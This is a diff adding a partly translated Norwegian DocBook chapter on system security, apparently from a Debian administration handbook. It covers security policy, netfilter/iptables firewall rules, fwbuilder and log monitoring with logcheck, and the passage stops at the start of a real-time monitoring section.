@@ -1,0 +1,2010 @@
+<?xml version='1.0' encoding='utf-8' ?>
+<!DOCTYPE chapter PUBLIC "-//OASIS//DTD DocBook XML V4.5//EN" "http://www.oasis-open.org/docbook/xml/4.5/docbookx.dtd" [
+]>
+<chapter id="security" lang="nb-NO">
+	<chapterinfo>
+		 <keywordset>
+			<keyword>Brannmur</keyword>
+			 <keyword>Nettfilter</keyword>
+			 <keyword>IDS/NIDS</keyword>
+
+		</keywordset>
+
+	</chapterinfo>
+	 <title>Sikkerhet</title>
+	 <highlights> <para>
+		Et informasjonssystem kan ha en varierende viktighet som følge av miljøfaktorer. Noen ganger kan det være livsviktig for bedriftens overlevelse, og må derfor beskyttes mot forskjellige former for risiko. Prosessen med å evaluere disse risikoene, definere og implementere beskyttelsesmekanismer kalles med et fellesord «sikkerhetsprosessen».
+	</para>
+	 </highlights> <section id="sect.defining-security-policy">
+		<title>Å definere en sikkerhetspolitikk</title>
+		 <sidebar> <title><emphasis>FORSIKTIG</emphasis> Hensikten med dette kapittelet</title>
+		 <para>
+			Datasikkerhet (eng: security) er et stort og følsomt tema, som ikke på langt nær kan beskrives fullstendig i bare ett kapittel. Vi vil bare framheve noen få viktige punkter. og beskrive noen av verktøyene og metodene som kan nyttes på dette feltet. For videre lesning, mangler det ikke på bøker øremerket til temaet. Et godt sted å starte kan være <citetitle>Linux Server Security</citetitle> av Michael D. Bauer (publisert av O'Reilly).
+		</para>
+		 </sidebar> <para>
+			The word “security” itself covers a vast range of concepts, tools and procedures, none of which apply universally. Choosing among them requires a precise idea of what your goals are. Securing a system starts with answering a few questions. Rushing headlong into implementing an arbitrary set of tools runs the risk of focusing on the wrong aspects of security.
+		</para>
+		 <para>
+			Den absolutt første tingen å avgjøre er derfor målet. En god tilnærming til å hjelpe til med denne avgjørelsen er å starte med disse spørsmålene:
+		</para>
+		 <itemizedlist>
+			<listitem>
+				<para>
+					<emphasis>Hva</emphasis> prøver man å beskytte? Sikkerhetspolitikken vil være forskjellig avhengig om man vil beskytte maskiner eller data. I sistnevnte tilfelle må vi også vite hvilke data.
+				</para>
+
+			</listitem>
+			 <listitem>
+				<para>
+					Hva prøver vi å beskytte <emphasis>mot</emphasis>? Er det lekkasje av sensitive data? Tap av data? Tap av inntekt som følge av forstyrrelser i tjenesten?
+				</para>
+
+			</listitem>
+			 <listitem>
+				<para>
+					Dessuten, <emphasis>hvem</emphasis> prøver vi vi å beskytte mot? Sikkerhetstiltakene vil variere stort mellom det å beskytte mot skrivefeil fra brukeren av systemet, og angrep fra motiverte grupper utenfra.
+				</para>
+
+			</listitem>
+
+		</itemizedlist>
+		 <para>
+			Ordet «risiko», i sikkerhetsøyemed, brukes gjerne som samlebegrep for disse tre faktorene: Hva som må beskyttes, hva som må hindres fra å skje, og hvem som det må beskyttes mot. Å modellere risikoen krever svar på disse tre spørsmålene. Utfra en slik risikomodell, kan en sikkerhetspolitikk konstrueres, og denne kan implementeres gjennom konkrete tiltak.
+		</para>
+		 <sidebar> <title><emphasis>NB</emphasis> Bestående spørsmål</title>
+		 <para>
+			Bruce Schneier, en verdenskjent sikkerhetsekspert (ikke bare på datasikkerhet), prøver å avlive en av de største mytene innen sikkerhet ved å si: «Sikkerhet er en prosess, ikke et produkt». Verdier som må beskyttes endrer seg over tid; det samme gjør truslene og tilgjengelige ressurser for mulige angripere. Selv om en sikkerhetspolitikk opprinnelig er perfekt konstruert og implementert, kan man ikke hvile på sine laurbær. Risikomomentene endrer seg, og da må tiltakene henge med.
+		</para>
+		 </sidebar> <para>
+			Andre begrensninger er også verdt å tenke på, ettersom de kan sette grenser for tilgjengelig ikkerhetspolitikk. Hvor langt er man villig til å gå for å sikre systemet? Dette spørsmålet har store konsekvenser for hva som skal implementeres. Det besvares altfor ofte kun utfra økonomi, selv om andre kriterier også bør tas i betraktning, som ulemper som påføres brukeren, og tap av ytelse.
+		</para>
+		 <para>
+			Når risikoen først er modellert, kan man begynne å tenke på å konstruere en faktisk sikkerhetspolitikk.
+		</para>
+		 <sidebar> <title><emphasis>NB</emphasis> Ekstrem politikk</title>
+		 <para>
+			Det er tilfeller hvor valget av tiltak som kreves for å sikre et system er ekstremt enkle.
+		</para>
+		 <para>
+			For eksempel, hvis systemet som skal sikres bare består av en gammel brukt maskin, med sitt ene formål å legge sammen noen tall på slutten av dagen, ville det antakelig være helt legitimt å ikke gjøre noen ting – verdien som ligger i systemet er lav, og det er ingen verdi i dataene, ettersom de ikke lagres på maskinen. En potensiell angriper ville bare få tilgang til en uhåndterlig kalkulator. Kostnaden ved å sikre et slikt system ville sannsynligvis oppveie kostnaden av et eventuelt tap.
+		</para>
+		 <para>
+			At the other end of the spectrum, we might want to protect the confidentiality of secret data in the most comprehensive way possible, trumping any other consideration. In this case, an appropriate response would be the total destruction of these data (securely erasing the files, shredding of the hard disks to bits, then dissolving these bits in acid, and so on). If there is an additional requirement that data must be kept in store for future use (although not necessarily readily available), and if cost still isn't a factor, then a starting point would be storing the data on iridium–platinum alloy plates stored in bomb-proof bunkers under various mountains in the world, each of which being (of course) both entirely secret and guarded by entire armies…
+		</para>
+		 <para>
+			Extreme though these examples may seem, they would nevertheless be an adequate response to defined risks, insofar as they are the outcome of a thought process that takes into account the goals to reach and the constraints to fulfill. When coming from a reasoned decision, no security policy is less respectable than any other.
+		</para>
+		 </sidebar> <para>
+			In most cases, the information system can be segmented in consistent and mostly independent subsets. Each subsystem will have its own requirements and constraints, and so the risk assessment and the design of the security policy should be undertaken separately for each. A good principle to keep in mind is that a short and well-defined perimeter is easier to defend than a long and winding frontier. The network organization should also be designed accordingly: the sensitive services should be concentrated on a small number of machines, and these machines should only be accessible via a minimal number of check-points; securing these check-points will be easier than securing all the sensitive machines against the entirety of the outside world. It is at this point that the usefulness of network filtering (including by firewalls) becomes apparent. This filtering can be implemented with dedicated hardware, but a possibly simpler and more flexible solution is to use a software firewall such as the one integrated in the Linux kernel.
+		</para>
+
+	</section>
+	 <section id="sect.firewall-packet-filtering">
+		<title>Brannmur eller pakkefiltrering</title>
+		 <indexterm>
+			<primary>brannmur</primary>
+		</indexterm>
+		 <indexterm>
+			<primary>pakkefilter</primary>
+		</indexterm>
+		 <sidebar> <title><emphasis>BACK TO BASICS</emphasis> Firewall</title>
+		 <indexterm>
+			<primary>pakke</primary>
+			<secondary>IP</secondary>
+		</indexterm>
+		 <para>
+			En <emphasis>brannmur</emphasis> er et stykke datautstyr med maskinvare og/eller programvare som sorterer innkommende og utgående nettverkspakker (som kommer til eller fra et lokalt nettverk) og bare slipper gjennom de som samsvarer med visse forhåndsbestemte betingelser.
+		</para>
+		 </sidebar> <para>
+			En brannmur er en nettverksport for filtrering, og er bare effektiv på pakker som må gå gjennom den. Den kan derfor bare være effektiv når den eneste ruten for disse pakkene er gjennom brannmuren.
+		</para>
+		 <para>
+			Mangelen på en standard konfigurasjon (og «prosess, ikke produkt»-mottoet) forklarer mangelen av en nøkkelferdig løsning. Det fins derimot verktøy som gjør det enklere å konfigurere <emphasis>netfilter</emphasis>-brannmuren, med en grafisk representasjon av filter-reglene. <command>fwbuilder</command> er utvilsomt blant de beste av dem.
+		</para>
+		 <indexterm>
+			<primary><emphasis>netfilter</emphasis></primary>
+		</indexterm>
+		 <sidebar> <title><emphasis>SPECIFIC CASE</emphasis> Local Firewall</title>
+		 <para>
+			A firewall can be restricted to one particular machine (as opposed to a complete network), in which case its role is to filter or limit access to some services, or possibly to prevent outgoing connections by rogue software that a user could, willingly or not, have installed.
+		</para>
+		 </sidebar> <para>
+			Linux-kjernen inneholder <emphasis>netfilter</emphasis>-brannmuren. Den kan kontrolleres fra brukerrommet med kommandoen <command>iptables</command>- og <command>ip6tables</command>-kommandoene. Forskjellen mellom disse er at den første betjener IPv4-nettverket, mens den siste betjener IPv6. Siden begge nettverksprotokollene sannsynligvis vil fortsette å eksistere i årevis, vil begge verktøyene måtte brukes i parallell.
+		</para>
+		 <indexterm>
+			<primary><command>iptables</command></primary>
+		</indexterm>
+		 <indexterm>
+			<primary><command>ip6tables</command></primary>
+		</indexterm>
+		 <section id="sect.netfilter">
+			<title>Netfilter Behavior</title>
+			 <para>
+				<emphasis>netfilter</emphasis> bruker fire forskjellige tabeller for regler om tre typer pakke-operasjoner:
+			</para>
+			 <itemizedlist>
+				<listitem>
+					<para>
+						<literal>filter</literal> concerns filtering rules (accepting, refusing or ignoring a packet);
+					</para>
+
+				</listitem>
+				 <listitem>
+					<para>
+						<literal>nat</literal> for oversetting av kilde- eller destinasjons-adresser og porter på pakker;
+					</para>
+
+				</listitem>
+				 <listitem>
+					<para>
+						<literal>mangle</literal> concerns other changes to the IP packets (including the ToS — <emphasis>Type of Service</emphasis> — field and options);
+					</para>
+
+				</listitem>
+				 <listitem>
+					<para>
+						<literal>raw</literal> allows other manual modifications on packets before they reach the connection tracking system.
+					</para>
+
+				</listitem>
+
+			</itemizedlist>
+			 <para>
+				Each table contains lists of rules called <emphasis>chains</emphasis>. The firewall uses standard chains to handle packets based on predefined circumstances. The administrator can create other chains, which will only be used when referred to by one of the standard chains (either directly or indirectly).
+			</para>
+			 <indexterm>
+				<primary>chain</primary>
+			</indexterm>
+			 <indexterm>
+				<primary>filtering rule</primary>
+			</indexterm>
+			 <para>
+				<literal>filter</literal>-tabellen har tre standardkjeder:
+			</para>
+			 <itemizedlist>
+				<listitem>
+					<para>
+						<literal>INPUT</literal>: gjelder pakker der destinasjon er brannmuren selv;
+					</para>
+
+				</listitem>
+				 <listitem>
+					<para>
+						<literal>OUTPUT</literal>: gjelder pakker som er sendt ut fra brannmuren;
+					</para>
+
+				</listitem>
+				 <listitem>
+					<para>
+						<literal>FORWARD</literal>: gjelder pakker i transitt gjennom brannmuren (som verken er kilden eller destinasjon deres).
+					</para>
+
+				</listitem>
+
+			</itemizedlist>
+			 <para>
+				The <literal>nat</literal>-tabellen har også tre standardkjeder:
+			</para>
+			 <itemizedlist>
+				<listitem>
+					<para>
+						<literal>PREROUTING</literal>: å endre pakker så snart de ankommer;
+					</para>
+
+				</listitem>
+				 <listitem>
+					<para>
+						<literal>POSTROUTING</literal>: å modifisere pakker når de er klare til utsendelse;
+					</para>
+
+				</listitem>
+				 <listitem>
+					<para>
+						<literal>OUTPUT</literal>: å modifisere pakker som genereres av selve brannmuren.
+					</para>
+
+				</listitem>
+
+			</itemizedlist>
+			 <figure id="figure.chaines-netfilter">
+				<title>Hvordan <emphasis>netfilter</emphasis>-kjeder påkalles</title>
+				 <mediaobject>
+					<imageobject>
+						<imagedata fileref="images/netfilter.png" format="PNG" scalefit="1" width="65%" />
+					</imageobject>
+
+				</mediaobject>
+
+			</figure>
+			 <para>
+				Hver kjede er en liste med regler; Hver regel er et sett av betingelser og en handling som skal utføres når vilkårene er oppfylt. Ved behandling av en pakke, skanner brannmur den riktige kjeden, en regel etter den andre; når vilkårene for en regel er oppfylt, "hopper" det (derav <literal>-j</literal>-alternativet i kommandoene) til det angitte tiltak for å fortsette prosessen. De vanligste handlingene er standardisert, med foreliggende øremerkede handlinger. Å ta én av disse standardhandlingene forstyrrer prosessen for kjeden, fordi pakkens skjebne allerede er fastsatt (sperring et unntak som er nevnt nedenfor):
+			</para>
+			 <sidebar> <title><emphasis>BACK TO BASICS</emphasis> ICMP</title>
+			 <para>
+				ICMP (<emphasis>Internet Control Message </emphasis>Protocol) er protokollen som brukes til å overføre utfyllende informasjon om kommunikasjon. Den tillater testing nettverkstilkobling med <command>ping</command>-kommandouen (som sender et ICMP <emphasis>echo request</emphasis>-budskap, som det er ment at mottakeren skal svare med et ICMP <emphasis>echo reply</emphasis>-budskap). Det signaliserer at en brannmur avviser en pakke, indikerer en mottaksbuffer er overfylt, foreslår en bedre rute for de neste pakkene i forbindelsen, og så videre. Denne protokollen er definert i flere RFC dokumenter; de opprinnelige RFC777 og RFC792 ble snart fullført og utvidet. <ulink type="block" url="http://www.faqs.org/rfcs/rfc777.html" /> <ulink type="block" url="http://www.faqs.org/rfcs/rfc792.html" />
+			</para>
+			 <para>
+				For referanse, en mottaksbuffer er en liten minnesone som lagrer data fra den tiden den kommer fra nettverket og til den tid kjernen håndterer den. Hvis denne sonen er full, kan nye data ikke mottas, og ICMP signaliserer problemet, slik at senderen kan bremse ned sin overføringshastighet (som bør ideelt sett nå en likevekt etter en tid).
+			</para>
+			 <indexterm>
+				<primary>ICMP</primary>
+			</indexterm>
+			 <indexterm>
+				<primary>Internet Control Message Protocol</primary>
+			</indexterm>
+			 <indexterm>
+				<primary>receive buffer</primary>
+			</indexterm>
+			 <indexterm>
+				<primary>buffer</primary>
+				<secondary>receive buffer</secondary>
+			</indexterm>
+			 <indexterm>
+				<primary><command>ping</command></primary>
+			</indexterm>
+			 <para>
+				Merk at selv om et IPv4-nettverk kan fungere uten ICMP, er ICMPv6 strengt nødvendig for et IPv6-nettverk, siden det kombinerer flere funksjoner som var i IPv4-verdenen, spredt over ICMPv4, IGMP( <emphasis>Internet Group Membership Protocol</emphasis>) og ARP (<emphasis>Address Resolution Protocol</emphasis>). ICMPv6 er definert i RFC4443. <ulink type="block" url="http://www.faqs.org/rfcs/rfc4443.html" />
+			</para>
+			 </sidebar> <para>
+			</para>
+			 <itemizedlist>
+				<listitem>
+					<para>
+						<literal>ACCEPT</literal>: tillater pakken å fortsette på sin vei;
+					</para>
+
+				</listitem>
+				 <listitem>
+					<para>
+						<literal>REJECT</literal>: avviser pakken med en ICMP-feilpakke (<literal>--reject-with <replaceable>type</replaceable></literal>-valgeet til <command>iptables</command> tillater å velge typen feil);
+					</para>
+
+				</listitem>
+				 <listitem>
+					<para>
+						<literal>DROP</literal>: slette (ignorere) pakken;
+					</para>
+
+				</listitem>
+				 <listitem>
+					<para>
+						<literal>LOG</literal>: logg (via <command>syslogd</command>) en melding med en beskrivelse av pakken. Merk at denne handlingen ikke avbryter prosessen, og kjøringen av kjeden fortsetter med den neste regelen, som er grunnen til at logging av avslåtte pakker krever både en LOG- og en REJECT/DROP-regel;
+					</para>
+
+				</listitem>
+				 <listitem>
+					<para>
+						<literal>ULOG</literal>: logger et budskap via <command>ulogd</command>, som kan tilpasses bedre og mer effektiv enn <command>syslogd</command> for håndtering av et stort antall meldinger. Merk at denne handlingen, slik som LOG, også returnerer prosessen til den neste regelen i påkallingskjeden;
+					</para>
+
+				</listitem>
+				 <listitem>
+					<para>
+						<replaceable>chain_name</replaceable>: hopper til den gitte kjeden og evaluerer dens regler,
+					</para>
+
+				</listitem>
+				 <listitem>
+					<para>
+						<literal>RETURN</literal>: avbryter prossesen til den gjeldende kjeden, og går tilbake til den anropende kjeden; i tilfelle den aktuelle kjeden er standard, er det ingen påkallingskjede, slik at standardhandlingen (definert med <literal>-P</literal>-valget til <command>iptables</command>) kjøres i stedet;
+					</para>
+
+				</listitem>
+				 <listitem>
+					<para>
+						<literal>SNAT</literal> (bare i <literal>nat</literal>-tabellen): bruk <emphasis>Source NAT</emphasis> (ekstra alternativer beskriver nøyaktig de endringene som skal brukes);
+					</para>
+
+				</listitem>
+				 <listitem>
+					<para>
+						<literal>DNAT</literal> (bare i <literal>nat</literal>-tabellen): bruk <emphasis>Destination NAT</emphasis> (ekstra alternativer beskriver nøyaktig de endringene som skal brukes);
+					</para>
+
+				</listitem>
+				 <listitem>
+					<para>
+						<literal>MASQUERADE</literal> (bare i <literal>nat</literal>-tabellen): bruk <emphasis>masquerading</emphasis> (et spesialtilfelle av <emphasis>Source NAT</emphasis>);
+					</para>
+
+				</listitem>
+				 <listitem>
+					<para>
+						<literal>REDIRECT</literal> (bare i <literal>nat</literal>-tabellen): å omdirigere en pakke til en gitt port i brannmuren selv. Denne kan brukes til å sette opp en gjennomsiktig nettmellomtjener som fungerer uten konfigurasjon på klientsiden, siden klienten tror den kobles til mottakeren, mens kommunikasjonen faktisk gå gjennom mellomtjeneren.
+					</para>
+
+				</listitem>
+
+			</itemizedlist>
+			 <para>
+				Andre handlinger, spesielt dem som gjelder <literal>mangle</literal>-tabellen, er utenfor formålet med teksten her. <citerefentry><refentrytitle>iptables</refentrytitle>
+				 <manvolnum>8</manvolnum></citerefentry> og <citerefentry><refentrytitle>ip6tables</refentrytitle>
+				 <manvolnum>8</manvolnum></citerefentry> har en omfattende liste.
+			</para>
+
+		</section>
+		 <section id="sect.iptables">
+			<title>Syntaksen til <command>iptables</command> and <command>ip6tables</command></title>
+			 <para>
+				<command>iptables</command> og <command>ip6tables</command>-kommandoene kan håndtere tabeller, kjeder og regler. Alternativet deres <literal>-t <replaceable>table</replaceable></literal> indikerer hvilken tabell en kan operere fra (som standard <literal>filter</literal>).
+			</para>
+			 <indexterm>
+				<primary><command>iptables</command></primary>
+			</indexterm>
+			 <indexterm>
+				<primary><command>ip6tables</command></primary>
+			</indexterm>
+			 <section id="sect.iptables-command">
+				<title>Kommandoer</title>
+				 <para>
+					<literal>-N <replaceable>chain</replaceable></literal>-valget lager en ny kjede. <literal>-X <replaceable>chain</replaceable></literal> sletter en tom eller ubrukt kjede. <literal>-A <replaceable>chain</replaceable> <replaceable>rule</replaceable></literal> legger til en regel ved slutten av en gitt kjede. <literal>-I <replaceable>chain</replaceable> <replaceable>rule_num</replaceable> <replaceable>rule</replaceable></literal>-valget setter inn en regel før regelnummeret <replaceable>rule_num</replaceable>. <literal>-D <replaceable>chain</replaceable> <replaceable>rule_num</replaceable></literal> (eller <literal>-D <replaceable>chain</replaceable> <replaceable>rule</replaceable></literal>)-valget sletter en regel i en kjede; Den første syntaksen identifiserer regelen som skal slettet ut fra nummeret den har. <literal>-F <replaceable>chain</replaceable></literal>-alternativet tømmer en kjede (sletter alle dens regler); hvis ingen kjede er nevnt, er alle reglene i tabellen slettet. <literal>-L <replaceable>chain</replaceable></literal>-valget lister reglene i kjeden. Til slutt, <literal>-P <replaceable>chain</replaceable> <replaceable>action</replaceable></literal>-valget definerer standardhandlingen, eller “policy”, for en gitt kjede; Merk at bare standardkjeder kan ha en slik "policy".
+				</para>
+
+			</section>
+			 <section id="sect.iptables-rules">
+				<title>Regler</title>
+				 <indexterm>
+					<primary>filtering rule</primary>
+				</indexterm>
+				 <para>
+					Hver regel er utrtrykt som <literal><replaceable>conditions</replaceable> -j <replaceable>action</replaceable> <replaceable>action_options</replaceable></literal>. Hvis flere betingelser er beskrevet i den samme regelen, da det kriteriet forbindelsen mellom betingelsene (logisk <emphasis>and</emphasis>), som er minst like restriktive som hver individuelle betingelse.
+				</para>
+				 <para>
+					<literal>-p <replaceable>protocol</replaceable></literal>-betingelsen samsvarer med protokollfeltet i IP-pakken. De vanligste verdiene er <literal>tcp</literal>, <literal>udp</literal>, <literal>icmp</literal>, og <literal>icmpv6</literal>. Å forhåndsinnstille betingelsen med et utropstegn som benekter betingelsen, som deretter blir en oppgave for "noen pakker med en annen protokoll enn den spesifiserte". Denne negasjonsmekanismen er ikke spesiell for <literal>-p</literal>-alternativet, og det kan brukes på alle andre forhold også.
+				</para>
+				 <para>
+					<literal>-s <replaceable>address</replaceable></literal> eller <literal>-s <replaceable>network/mask</replaceable></literal>-betingelsen samsvarer med pakkens kildeadresse. Tilsvarende, <literal>-d <replaceable>address</replaceable></literal> eller <literal>-d <replaceable>network/mask</replaceable></literal> samsvarer med måladressen.
+				</para>
+				 <para>
+					<literal>-i <replaceable>interface</replaceable></literal>-betingelsen velger pakker som kommer inn fra et bestemt nettverksgrensesnitt. <literal>-o <replaceable>interface</replaceable></literal> velger pakker som går ut via et spesifikt grensesnitt.
+				</para>
+				 <para>
+					Det er mer spesifikke betingelser, avhengig av de generelle betingelser som er beskrevet ovenfor. For eksempel <literal>-p tcp</literal>-betingelsen kan kompletteres med betingelser i TCP-portene, med klausuler som<literal>--source-port <replaceable>port</replaceable></literal> og <literal>--destination-port <replaceable>port</replaceable></literal>.
+				</para>
+				 <para>
+					<literal>--state <replaceable>state</replaceable></literal>-betingelsen samsvarer med tilstanden til en pakke i en forbindelse (dette krever kjernemodulen <command>ipt_conntrack</command> for koblingssporing). <literal>NEW</literal> tilstanden beskriver en pakke som starter en ny forbindelse; <literal>ESTABLISHED</literal> samsvarer med pakker som tilhører en allerede eksisterende kobling, og <literal>RELATED</literal> samsvarer med pakker som initierer en ny tilkobling knyttet til en eksisterende (som er nyttig for <literal>ftp-data</literal>-forbindelsene i FTP-protokollens "aktivmodus").
+				</para>
+				 <para>
+					Den forrige seksjonen viser tilgjengelige handlinger, men ikke de respektive alternativene.<literal>LOG</literal>-handlingen, har for eksempel de følgende valgene:
+				</para>
+				 <itemizedlist>
+					<listitem>
+						<para>
+							<literal>--log-level</literal>, med standardverdi <literal>warning</literal>, indikerer alvorlighetsgraden <command>syslog</command>;
+						</para>
+
+					</listitem>
+					 <listitem>
+						<para>
+							<literal>--log-prefix</literal> tillater å spesifisere en tekstforstavelse for å skille mellom loggede meldinger;
+						</para>
+
+					</listitem>
+					 <listitem>
+						<para>
+							<literal>--log-tcp-sequence</literal>, <literal>--log-tcp-options</literal> og <literal>--log-ip-options</literal> indikerer ekstra data som skal integreres i meldingen: henholdsvis TCP sekvensnummer, TCP-alternativer, og IP-alternativer.
+						</para>
+
+					</listitem>
+
+				</itemizedlist>
+				 <para>
+					<literal>DNAT</literal> handlingen gir <literal>--to-destination <replaceable>address</replaceable>:<replaceable>port</replaceable></literal> valget for å indikere den nye destinasjonens IP adresse og/eller port. Tilsvarende, <literal>SNAT</literal> gir <literal>--to-source <replaceable>address</replaceable>:<replaceable>port</replaceable></literal> for å indikere den nye kildens IP-adresse og/eller port.
+				</para>
+				 <para>
+					<literal>REDIRECT</literal>-handlingen (bare hvis NAT er tilgjengelig) gir <literal>--to-ports <replaceable>port(s)</replaceable></literal>-valget for å angi porten, eller portområdet, dit pakkene skal omdirigeres.
+				</para>
+
+			</section>
+
+		</section>
+		 <section id="sect.creating-rules">
+			<title>Å lage regler</title>
+			 <para>
+				Hver regeletablering krever bruk av <command>iptables</command>/<command>ip6tables</command>. Å skrive disse kommandoene manuelt kan være kjedelig, så anropene lagres vanligvis i et skript slik at den samme konfigurasjonen blir satt opp automatisk hver gang maskinen starter. Dette skriptet kan skrives for hånd, men det kan også være interessant å forberede det med et høynivå verktøy som <command>fwbuilder</command>.
+			</para>
+			 
+<screen>
+<computeroutput># </computeroutput><userinput>apt install fwbuilder</userinput></screen>
+			 <para>
+				Prinsippet er enkelt. I det første trinnet, må man beskrive alle elementene som involveres i selve reglene:
+			</para>
+			 <itemizedlist>
+				<listitem>
+					<para>
+						brannmuren selv, med sine nettverksgrensesnitt;
+					</para>
+
+				</listitem>
+				 <listitem>
+					<para>
+						nettverkene, med sine tilhørende IP-serier;
+					</para>
+
+				</listitem>
+				 <listitem>
+					<para>
+						tjenerne;
+					</para>
+
+				</listitem>
+				 <listitem>
+					<para>
+						portene som tilhører de tjenestene som ligger på tjenerne.
+					</para>
+
+				</listitem>
+
+			</itemizedlist>
+			 <para>
+				Reglene blir deretter laget med enkle dra-og-slipp-handlinger på objektene. Noen kontekstmenyer kan endre betingelsen (nekte den, for eksempel). Deretter må handlingen velges og konfigureres.
+			</para>
+			 <para>
+				Såvidt det gjelder IPv6, kan man enten lage to forskjellige regelsett for IPv4 og IPv6, eller bare lage ett og la <command>fwbuilder</command> oversette reglene i følge de adressene som er tildelt stedene.
+			</para>
+			 <figure id="figure.fwbuilder">
+				<title>Fwbuilders hovedvindu</title>
+				 <mediaobject>
+					<imageobject>
+						<imagedata fileref="images/fwbuilder.png" format="PNG" scalefit="1" />
+					</imageobject>
+
+				</mediaobject>
+
+			</figure>
+			 <indexterm>
+				<primary><command>fwbuilder</command></primary>
+			</indexterm>
+			 <para>
+				<command>fwbuilder</command> kan deretter generere et skript som konfigurerer brannmuren etter de regler som er angitt. Dens modulære arkitektur gir det muligheten til å generere skript rettet mot ulike systemer: <command>iptables</command> for Linux, <command>ipf</command> for FreeBSD og <command>pf</command> for OpenBSD.
+			</para>
+
+		</section>
+		 <section id="sect.install-rules-at-boot">
+			<title>Å installere reglene ved hver oppstart</title>
+			 <para>
+				I andre tilfeller er den anbefalte måten å registrere skriptet i en <literal>up</literal> directive of the <filename>/etc/network/interfaces</filename>-fil. I det følgende eksemplet er skriptet lagret under <filename>/usr/local/etc/arrakis.fw</filename>.
+			</para>
+			 <example id="example.network-interfaces-firewall">
+				<title><filename>interfaces</filename>-file som påkaller et brannmurskript</title>
+				 
+<programlisting>auto eth0
+iface eth0 inet static
+    address 192.168.0.1
+    network 192.168.0.0
+    netmask 255.255.255.0
+    broadcast 192.168.0.255
+    up /usr/local/etc/arrakis.fw
+</programlisting>
+
+			</example>
+			 <para>
+				Dette forutsetter selvsagt at du bruker <emphasis role="pkg">ifupdown</emphasis> til å konfigurere nettverksgrensesnittet. Hvis du bruker noe annet (som <emphasis>NetworkManager</emphasis> eller <emphasis>systemd-networkd</emphasis>), henvis deretter til deres respektive dokumentasjon for å finne ut måter til å kjøre et skript etter at grensesnittet har tatt frem.
+			</para>
+
+		</section>
+
+	</section>
+	 <section id="sect.supervision">
+		<title>Overvåking: Forebygging, avdekking, avskrekking</title>
+		 <indexterm>
+			<primary>monitoring</primary>
+		</indexterm>
+		 <para>
+			Overvåking er en integrert del av enhver sikkerhetspolitikk av flere grunner. Blant dem, at målet om sikkerhet er vanligvis ikke begrenset til å garantere datakonfidensialitet, men det inkluderer også å sikre tjenestenes tilgjengelighet. Det er derfor viktig å sjekke at alt fungerer som forventet, og å i tide oppdage avvikende atferd eller endring i kvaliteten på tjenesten(e) som blir levert. Å overvåke aktivitet kan bidra til å oppdage inntrengingsforsøk og muliggjøre en rask reaksjon før de forårsaker alvorlige konsekvenser. Denne delen vurderer noen verktøy som kan brukes til å overvåke flere aspekter av et Debian-systemet. Som sådan, fullfører den <xref linkend="sect.monitoring" />.
+		</para>
+		 <section id="sect.logcheck">
+			<title>Å overvåke logger med <command>logcheck</command></title>
+			 <indexterm>
+				<primary><command>logcheck</command></primary>
+			</indexterm>
+			 <indexterm>
+				<primary>logs</primary>
+				<secondary>monitoring</secondary>
+			</indexterm>
+			 <indexterm>
+				<primary>monitoring</primary>
+				<secondary>log files</secondary>
+			</indexterm>
+			 <para>
+				<command>logcheck</command>-programmet overvåker loggfiler som standard hver time. Det sender uvanlige loggmeldinger i e-post til administratoren for videre analyse.
+			</para>
+			 <para>
+				Listen over overvåkede filer lagres i <filename>/etc/logcheck/logcheck.logfiles</filename>; standardverdiene fungerer fint hvis <filename>/etc/rsyslog.conf</filename>-filen ikke har blitt fullstendig overhalt.
+			</para>
+			 <para>
+				<command>logcheck</command> kan arbeide i en av tre mer eller mindre detaljerte modi:<emphasis>paranoid</emphasis>, <emphasis>server</emphasis> og <emphasis>workstation</emphasis>. Den først er <emphasis>very</emphasis> ordrik, og bør nok være begrenset til bestemte tjenere slike som brannmurer. Den andre (og standard) modus anbefales for de fleste tjenere. Den siste er beregnet for arbeidsstasjoner, og er mer finslipt (den filtrerer ut flere meldinger).
+			</para>
+			 <para>
+				I alle tre tilfelle, bør nok <command>logcheck</command> være tilpasset for å utelukke noen ekstra meldinger (avhengig av installerte tjenester), med mindre admin virkelig hver time ønsker å motta grupper av lange uinteressante e-poster. Siden utvalgsmekanismen for meldinger er ganske komplisert, kreves <filename>/usr/share/doc/logcheck-database/README.logcheck-database.gz</filename> — hvis utfordrende — les.
+			</para>
+			 <para>
+				De anvendte reglene kan deles inn i flere typer:
+			</para>
+			 <itemizedlist>
+				<listitem>
+					<para>
+						de som kvalifiserer en melding som et inntrengningsforsøk (lagret i en fil i <filename>/etc/logcheck/cracking.d/</filename>-mappen);
+					</para>
+
+				</listitem>
+				 <listitem>
+					<para>
+						de som de avbryter slik kvalifisering (<filename>/etc/logcheck/cracking.ignore.d/</filename>);
+					</para>
+
+				</listitem>
+				 <listitem>
+					<para>
+						de som klassifiserer en melding som et sikkerhetsvarsel (<filename>/etc/logcheck/violations.d/</filename>);
+					</para>
+
+				</listitem>
+				 <listitem>
+					<para>
+						de som avbryter denne klassifisering (<filename>/etc/logcheck/violations.ignore.d/</filename>);
+					</para>
+
+				</listitem>
+				 <listitem>
+					<para>
+						til slutt, de som andvendes til de gjenstående budskapene (ansett som <emphasis>system events</emphasis>).
+					</para>
+
+				</listitem>
+
+			</itemizedlist>
+			 <sidebar> <title><emphasis>CAUTION</emphasis> Å ignorere et budskap</title>
+			 <para>
+				Alle meldinger merket som et inntrengingsforsøk eller en sikkerhetsadvarsel (etter en regel lagret i en <filename>/etc/logcheck/violations.d/myfile</filename>-fil) kan bare ignoreres med en regel i en <filename>/etc/logcheck/violations.ignore.d/myfile</filename> eller <filename>/etc/logcheck/violations.ignore.d/myfile-<replaceable>extension</replaceable></filename>-fil.
+			</para>
+			 </sidebar> <para>
+				En system hendelse signaliseres alltid med mindre en regel i en av <filename>/etc/logcheck/ignore.d.{paranoid,server,workstation}/</filename>-mappene fastslår at handlingen skal ignoreres. Selvfølgelig, de eneste mapper som tas i betraktning, er de som tilsvarer et detaljnivået likt eller større enn den valgte driftsmodus.
+			</para>
+
+		</section>
+		 <section id="sect.monitoring-activity">
+			<title>Overvåkingsaktivitet</title>
+			 <indexterm>
+				<primary>monitoring</primary>
+				<secondary>activity</secondary>
+			</indexterm>
+			 <indexterm>
+				<primary>activity, monitoring</primary>
+			</indexterm>
+			 <section id="sect.real-time-monitoring">
+				<title>I sanntid</title>
+				 <para>
